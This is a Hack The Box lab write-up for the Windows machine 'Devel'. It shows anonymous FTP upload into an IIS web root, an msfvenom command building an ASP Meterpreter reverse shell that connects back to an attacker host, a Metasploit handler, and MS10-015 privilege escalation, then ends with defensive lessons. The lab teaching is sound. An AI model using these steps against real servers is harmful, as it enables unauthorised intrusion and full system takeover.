# Hack The Box - Devel

## Machine Information

| Field            | Details                                                                     |
| ---------------- | --------------------------------------------------------------------------- |
| Platform         | Hack The Box                                                                |
| Machine          | Devel                                                                       |
| Difficulty       | Easy                                                                        |
| Operating System | Windows                                                                     |
| Category         | Web Exploitation, File Upload, Privilege Escalation                         |
| Main Skills      | FTP enumeration, IIS exploitation, ASP upload, Windows privilege escalation |

---

# Overview

Devel is a Windows machine that demonstrates how insecure FTP configurations and web application weaknesses can lead to complete system compromise.

The attack path includes:

* Service enumeration
* Anonymous FTP access
* Uploading a malicious file
* Obtaining a reverse shell
* Windows privilege escalation

---

# Reconnaissance

The first step was identifying exposed services.

## Nmap Scan

```bash id="9n4x7m"
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The scan revealed:

```text id="4m8q2v"
21/tcp FTP
80/tcp HTTP
```

The services were investigated.

---

# FTP Enumeration

The FTP service was checked for anonymous access.

```bash id="7x2p9k"
ftp <TARGET_IP>
```

Anonymous login was allowed.

```text id="5v8m3q"
Username: anonymous
Password: anonymous
```

Files could be uploaded to the FTP server.

---

# Web Server Analysis

The HTTP service was running Microsoft IIS.

Because FTP and IIS shared the same directory, uploaded files were accessible through the web server.

The upload location was tested:

```text id="2q6n9x"
http://<TARGET_IP>/<uploaded_file>
```

---

# Initial Access

A malicious ASP.NET payload was created.

Example:

```bash id="8m4x1z"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f asp -o shell.asp
```

The file was uploaded through FTP.

A listener was started:

```bash id="6p3w9m"
msfconsole
```

Handler:

```bash id="1x7q5v"
use exploit/multi/handler
```

After accessing the uploaded file, a Meterpreter session was received.

---

# User Enumeration

The current user was checked:

```bash id="4z8m2n"
getuid
```

System information was gathered:

```bash id="9q5v3x"
sysinfo
```

---

# Privilege Escalation

The system was checked for local vulnerabilities.

Windows enumeration was performed.

The machine was vulnerable to:

```text id="3m6x8p"
MS10-015
```

A kernel exploit was used to escalate privileges.

---

# Root Access

After privilege escalation:

```bash id="7n2q5m"
getuid
```

Output:

```text id="5x8m1q"
NT AUTHORITY\SYSTEM
```

Full administrative access was obtained.

---

# Flag Retrieval

User flag:

```text id="8q3m6v"
C:\Users\<user>\Desktop\user.txt
```

Administrator flag:

```text id="2m7x9p"
C:\Users\Administrator\Desktop\root.txt
```

---

# Tools Used

* Nmap
* FTP
* Gobuster
* MSFVenom
* Metasploit
* Windows enumeration tools

---

# Vulnerabilities Identified

## Anonymous FTP Access

**Type:** Misconfiguration

**Impact:**

Allowing anonymous uploads can enable attackers to place malicious files on the server.

---

## File Upload Vulnerability

**Type:** Remote Code Execution

**Impact:**

Uploading executable server-side files can lead to command execution.

---

## Windows Kernel Privilege Escalation

**Type:** Local Privilege Escalation

**Impact:**

Unpatched Windows systems may allow local users to gain SYSTEM privileges.

---

# Lessons Learned

* Anonymous FTP access should be disabled unless required.
* Uploaded files must be validated and restricted.
* Web servers should not share insecure directories with file transfer services.
* Windows systems require regular security updates.
